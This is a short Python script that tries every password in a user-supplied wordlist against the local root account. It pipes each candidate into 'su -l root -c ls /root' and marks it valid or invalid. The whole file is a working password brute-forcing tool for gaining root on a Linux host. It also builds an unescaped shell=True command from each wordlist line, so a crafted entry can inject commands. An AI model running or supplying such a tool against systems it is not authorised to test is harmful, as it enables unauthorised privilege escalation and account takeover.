from os.path import exists
import argparse
import subprocess

FAIL = b'Password: \r\nsu: Authentication failure'
FILE = './list.txt'

parser = argparse.ArgumentParser(description='Check su passwords', usage='%(prog)s --wordlist=<wordlist>')
parser.add_argument('--wordlist', help='password list to try', required=True)
args = parser.parse_args()
inputFile = args.wordlist


def check_exists(passFile):
    if exists(passFile):
        return passFile 
    else:
        print('File {} does not exist'.format(passFile))
        parser.print_help()
        exit()

def validate_pass(passwd):
    ret = 0
    try:
        cmd = '{ sleep 1; echo "%s"; } | script -q -c "su -l root -c ls /root" /dev/null' % passwd
        ret = subprocess.check_output(cmd, shell=True)
        return ret
    except:
        return 1

#passwd = getpass.getpass(prompt='Password: ', stream=None)
def verify(passwd):
  res = validate_pass(passwd).strip()
  if FAIL == res:
    print (passwd.strip() + ":Invalid password")
  else:
    print (passwd.rstrip() + ":Valid password")

def main():
  passFile = check_exists(inputFile)

  with open(passFile, 'r') as f:
    data = f.readlines()
  for password in data:
    verify(password)

if __name__ == '__main__':
    #pass
    main()
